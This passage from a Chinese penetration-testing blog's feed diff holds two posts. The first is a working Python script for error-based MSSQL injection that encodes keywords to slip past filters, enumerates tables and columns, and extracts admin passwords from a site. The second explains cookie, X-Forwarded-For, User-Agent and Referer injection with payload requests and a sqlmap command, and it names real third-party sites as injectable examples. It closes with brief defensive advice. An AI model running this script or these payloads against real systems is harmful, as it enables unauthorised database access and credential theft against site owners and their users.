class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/</span><br><span class="line">env python</span><br><span class="line">#coding=utf-8</span><br><span class="line">import re</span><br><span class="line">import urllib</span><br><span class="line">import urllib2</span><br><span class="line">#从访问链接中获取报错信息</span><br><span class="line"></span><br><span class="line">def getcontent(payload):  #获取网页内容</span><br><span class="line">    url1=url+&quot;AND (&quot;+payload+&quot;)=1 --- &quot;</span><br><span class="line">    content = urllib.urlopen(url1).read()</span><br><span class="line">    print content</span><br><span class="line">    return  content</span><br><span class="line"></span><br><span class="line">#从报错回显中提取数值</span><br><span class="line">def getdata(content):</span><br><span class="line">    patt = re.compile(&quot;nvarchar.*?&apos;(.*?)&apos;.*?int&quot;)</span><br><span class="line">    data = patt.findall(content)</span><br><span class="line">    if data:</span><br><span class="line">        return data[0]</span><br><span class="line">    else:</span><br><span class="line">        return None</span><br><span class="line">#获取当前数据库名</span><br><span class="line">def getcurrentdb():</span><br><span class="line">    payload = &apos;db_name()&apos;</span><br><span class="line">    content = getcontent(payload)</span><br><span class="line">    data = getdata(content)</span><br><span class="line">    print &quot;current_db: &quot;+data</span><br><span class="line">    return data</span><br><span class="line">def gettablename(dbname,n):  #获取表名</span><br><span class="line">    tablelist1=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload = &quot;select top 1 name %u0066rom &quot;+dbname+&quot;.dbo.sysobjects where xtype=&apos;U&apos; and name  not in(select top &quot;+str(i)+&quot; name %u0066rom &quot;+dbname+&quot;.dbo.sysobjects where xtype=&apos;U&apos; order by name) order by name&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)</span><br><span class="line">            #print data</span><br><span class="line">            if data not in tablelist1:</span><br><span class="line">                tablelist1.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print tablelist1</span><br><span class="line">    print &apos;--------------------&apos;</span><br><span class="line"></span><br><span class="line">def getcolumns(dbname,table,n):  #获取列名</span><br><span class="line">    tablelist2=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload=&quot;Select top 1 name %u0066rom &quot;+dbname+&quot;.dbo.SysColumns Where id=Object_Id(&apos;&quot;+table+&quot;&apos;) and name not in (Select top &quot;+str(i)+&quot; Name %u0066rom &quot;+dbname+&quot;.dbo.SysColumns Where id=Object_Id(&apos;&quot;+table+&quot;&apos;) order by name) order by name&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)</span><br><span class="line">            if  data not in tablelist2:</span><br><span class="line">                tablelist2.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print table</span><br><span class="line">    print tablelist2</span><br><span class="line">    print &apos;--------------------&apos;</span><br><span class="line">def getvalue(dbname,table,column,n):  #获取各字段的值</span><br><span class="line">    tablelist3=[]</span><br><span class="line">    for i in range(n):</span><br><span class="line">        payload=&quot;select top 1 &quot;+column+&quot; %u0066rom &quot;+table+&quot; where &quot;+column+&quot; not in(select top  &quot;+str(i)+&quot; &quot;+column+&quot; %u0066rom &quot;+table+&quot; order by  id)order by id&quot;</span><br><span class="line">        try:</span><br><span class="line">            content = getcontent(payload)</span><br><span class="line">            data = getdata(content)  </span><br><span class="line">            if  data  not in tablelist3:</span><br><span class="line">                tablelist3.append(data)</span><br><span class="line">            else:</span><br><span class="line">                break</span><br><span class="line">        except:</span><br><span class="line">            continue</span><br><span class="line">    print column</span><br><span class="line">    print tablelist3</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    url=&quot;http://www.example/pages/BulletinPage.aspx?id=21&quot;</span><br><span class="line">    global url</span><br><span class="line">    db=getcurrentdb()</span><br><span class="line">    gettablename(&apos;saa&apos;,200)</span><br><span class="line">    getcolumns(db,&apos;Admin_Login&apos;,50)</span><br><span class="line">    getvalue(db,&apos;Admin_Login&apos;,&apos;LoginPwd&apos;,50)   #可自行选择注释，只留你需要的那个函数进行值得获取</span><br></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在进行mssql注入的时候，由于各种各样的原因，我们不能使用工具进行值得获取，那么可以自行编写脚本来获取值，python由于其良好的抓取网页的功能，被大家广泛使用。
+    
+    </summary>
+    
+      <category term="渗透测试" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+    
+      <category term="python" scheme="http://yoursite.com/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTTP请求头信息的注入</title>
+    <link href="http://yoursite.com/2014/09/10/HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%E4%BF%A1%E6%81%AF%E7%9A%84%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2014/09/10/HTTP请求头信息的注入/</id>
+    <published>2014-09-09T16:00:00.000Z</published>
+    <updated>2016-05-15T12:39:16.766Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote>
+<p>常见http可能被污染的参数有这些</p>
+</blockquote>
+<pre><code>- User-agent 浏览器版本 （少）
+- Referer      来源（少）
+- X-Forwarded-For 获取ip（高）
+- client_ip   获取ip（高）
+-cookie      获取cookie值（高）
+</code></pre><a id="more"></a>
+<h3 id="一-cookie注入"><a href="#一-cookie注入" class="headerlink" title="一. cookie注入"></a>一. cookie注入</h3><ol>
+<li>原理： 在ASP中,request对象获取客户端提交数据常用的是get和post两种方式,同时request对象可以不通过集合来获得数据,即直接使用”request(“name”)”. 但它效率低下,容易出错,当我们省略具体的集合名称时,asp是按QueryString(get),Form(post),Cookie,Severvariable,集合的顺序来搜索的.cookie是保存在客户端的一个文本文件,可以进行修改,这样一来,就可以利用Request.cookie方式来提交变量的值,从而利用系统的漏洞进行注入攻击.</li>
+<li>条件1是程序对get和post方式提交的数据进行了过滤，但未对cookie提交的数据库进行过滤。条件2，在1的基础上还需要程序对提交数据获取方式是直接request(“xxx”)的方式，未指明使用request对象的具体方法进行获取。</li>
+<li><p>首先 我们需要找到一个注入点，如果是使用get方式提交的参数，要更改成cookie方式提交，我们首先要访问正常的存在注入点的页面，等页面完全打开之后，在开发者环境的console栏中，输入alert(document.cookie=”id=”+escape(“x”)); 这里的“id=”便是注入点中注入参数，x便是页面的参数的数值了，这两处要根据实际情况来定义。写完之后按下回车网页中会弹出一个对话框现在更改好了cookie后我们就要试下能不能正常访问了，现在在另外一个窗口中重新打开那个注入点既是将“id=x”去掉后的，然后看是否能正常访问。如果去掉之后能够继续访问 那么说明可以进行cookie注入，这样就说明程序在使用request对象获取数据的时候并未指明具体使用什么方法来获取，而是直接使用request(“xx”)的方式。<br>4.实例 <a href="http://sef.xjtu.edu.cn/news_content.asp?id=2074" target="_blank" rel="external">http://sef.xjtu.edu.cn/news_content.asp?id=2074</a></p>
+<h3 id="二-X-Forwarded-For注入"><a href="#二-X-Forwarded-For注入" class="headerlink" title="二.  X-Forwarded-For注入()"></a>二.  X-Forwarded-For注入()</h3><ol>
+<li>X-Forwarded-For是HTTP头的一个字段。它被认为是客户端通过HTTP代理或者负载均衡器连接到web服务端获取源ip地址的一个标准。</li>
+<li>X-Forwarded-For注入常见于检测用户ip是否合法，进行sql查询的时没有过滤获取ip的参数。</li>
+<li>利用方法，可以用firefox中的X-Forwarded-For Header插件。或者将抓的头信息的包保存在sqlmap的根路径，比如test.txt，python sqlmap.py -r test.txt –level 3</li>
+</ol>
+</li>
+<li><p>实例：<a href="http://www.alexa.cn/" target="_blank" rel="external">http://www.alexa.cn/</a></p>
+<h3 id="三-User-agent注入"><a href="#三-User-agent注入" class="headerlink" title="三.  User-agent注入"></a>三.  User-agent注入</h3><p>用户代理（user agent）是记录软件程序的客户端信息的HTTP头字段，他可以用来统计目标和违规协议。在HTTP头中应该包含它，这个字段的第一个空格前面是软件的产品名称，后面有一个可选的斜杠和版本号。并不是所有的应用程序都会被获取到user-agent信息，但是有些应用程序利用它存储一些信息（如：购物车）。在这种情况下，我们就有必要研究下user-agent头存在的问题了。HTTP查询实例：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: aaa’ or 1/*</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h3 id="四-Referer注入"><a href="#四-Referer注入" class="headerlink" title="四. Referer注入"></a>四. Referer注入</h3><p>Referer是另外一个当应用程序没有过滤存储到数据库时，容易发生SQL注入的HTTP头。它是一个允许客户端指定的可选头部字段，通过它我们可以获取到提交请求URI的服务器情况。它允许服务器产生一系列的回退链接文档，像感兴趣的内容，日志等。它也允许跟踪那些坏链接以便维护。</p>
+<p>例如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">Host: [host]</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36</span><br><span class="line"></span><br><span class="line">Referer: http://www.yaboukir.com&apos;</span><br></pre></td></tr></table></figure></p>
+<p>实例：<a href="http://baike.cardbaobao.com/index.php?user-login" target="_blank" rel="external">http://baike.cardbaobao.com/index.php?user-login</a></p>
+<h3 id="五-防止消息头注入漏洞"><a href="#五-防止消息头注入漏洞" class="headerlink" title="五. 防止消息头注入漏洞"></a>五. 防止消息头注入漏洞</h3><p>&emsp;&emsp;防止HTTP消息头注入漏洞的最有效方法是，不将用户控制的输入插入到应用程序返回的HTTP消息头中。通常我们可以用一些较为安全的方法代替这种行为。<br>&emsp;&emsp;如果不可避免地要在HTTP消息头中插入用户控制的数据，那么应用程序应采取以下这种双重深层防御方法防止漏洞产认。应用程序应根据情形，对插入的数据进行尽可能严格的确认。例如，如果根据用户输入设定一个cookie值，那么应当限制这个值仅包含字母字符，最大长度为6B。<br>&emsp;&emsp;应对插入消息头的每一个数据进行过滤，检测可能的恶意字符。实际上，任何ASCII码小于0x20的字符都应被视为可疑的恶意字符，应用程序应拒绝包含这些字符的请求。通过对所有应用程序内容使用 HTTPS，应用程序即可防止攻击者利用任何残留的消息头注入漏洞”毒害”代理服务器缓存。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;blockquote&gt;
+&lt;p&gt;常见http可能被污染的参数有这些&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;pre&gt;&lt;code&gt;- User-agent 浏览器版本 （少）
+- Referer      来源（少）
+- X-Forwarded-For 获取ip（高）
+- client_ip   获取ip（高）
+-cookie      获取cookie值（高）
+&lt;/code&gt;&lt;/pre&gt;
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="注入技巧" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/"/>
+    
+  </entry>
+  
+</feed>
